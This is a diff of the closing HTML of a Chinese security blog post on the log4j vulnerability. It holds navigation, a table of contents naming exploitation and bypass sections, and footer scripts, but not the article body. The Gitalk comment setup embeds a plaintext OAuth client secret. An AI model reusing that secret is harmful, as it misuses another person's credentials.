+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2021/12/16/log4j漏洞分析/">log4j漏洞分析</a></li>
+            <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2021/12/16/log4j漏洞分析/">https://blog.play2win.top/2021/12/16/log4j漏洞分析/</a></li>
+            <li><strong>发布时间：</strong>2021-12-16</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/JNDI/">JNDI</a>, <a class="has-link-grey -link" href="/tags/log4j/">log4j</a>, <a class="has-link-grey -link" href="/tags/struts2/">struts2</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2022/02/16/Java_RMI攻击分析与总结/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">Java RMI攻击分析与总结</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2021/11/25/fastjson不出网利用简析/">
+                <span class="level-item">fastjson不出网利用简析</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: '40ae7fea35adab99f5a5beb0ea8eac72',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        他们的爱与风华，只问自由，只问盛放，只问深情，只问初心，只问勇敢，无问西东。
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        35
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        31
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/P1ay2win/">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com/p1ay2win">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#前言">
+        <span class="has-mr-6">1</span>
+        <span>前言</span>
+        </a></li><li>
+        <a class="is-flex" href="#简介">
+        <span class="has-mr-6">2</span>
+        <span>简介</span>
+        </a></li><li>
+        <a class="is-flex" href="#漏洞分析">
+        <span class="has-mr-6">3</span>
+        <span>漏洞分析</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#漏洞触发">
+        <span class="has-mr-6">3.1</span>
+        <span>漏洞触发</span>
+        </a></li><li>
+        <a class="is-flex" href="#代码分析">
+        <span class="has-mr-6">3.2</span>
+        <span>代码分析</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#RC1修复绕过">
+        <span class="has-mr-6">4</span>
+        <span>RC1修复绕过</span>
+        </a></li><li>
+        <a class="is-flex" href="#其他利用方式">
+        <span class="has-mr-6">5</span>
+        <span>其他利用方式</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#读取敏感信息">
+        <span class="has-mr-6">5.1</span>
+        <span>读取敏感信息</span>
+        </a></li><li>
+        <a class="is-flex" href="#读取配置文件">
+        <span class="has-mr-6">5.2</span>
+        <span>读取配置文件</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#受影响组件触发方式">
+        <span class="has-mr-6">6</span>
+        <span>受影响组件触发方式</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#struts2">
+        <span class="has-mr-6">6.1</span>
+        <span>struts2</span>
+        </a></li><li>
+        <a class="is-flex" href="#vmware">
+        <span class="has-mr-6">6.2</span>
+        <span>vmware</span>
+        </a></li><li>
+        <a class="is-flex" href="#slor">
+        <span class="has-mr-6">6.3</span>
+        <span>slor</span>
+        </a></li><li>
+        <a class="is-flex" href="#James">
+        <span class="has-mr-6">6.4</span>
+        <span>James</span>
+        </a></li><li>
+        <a class="is-flex" href="#Druid">
+        <span class="has-mr-6">6.5</span>
+        <span>Druid</span>
+        </a></li><li>
+        <a class="is-flex" href="#JSPWiki">
+        <span class="has-mr-6">6.6</span>
+        <span>JSPWiki</span>
+        </a></li><li>
+        <a class="is-flex" href="#OFBiz">
+        <span class="has-mr-6">6.7</span>
+        <span>OFBiz</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#后记">
+        <span class="has-mr-6">7</span>
+        <span>后记</span>
+        </a></li><li>
+        <a class="is-flex" href="#参考">
+        <span class="has-mr-6">8</span>
+        <span>参考</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2022 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
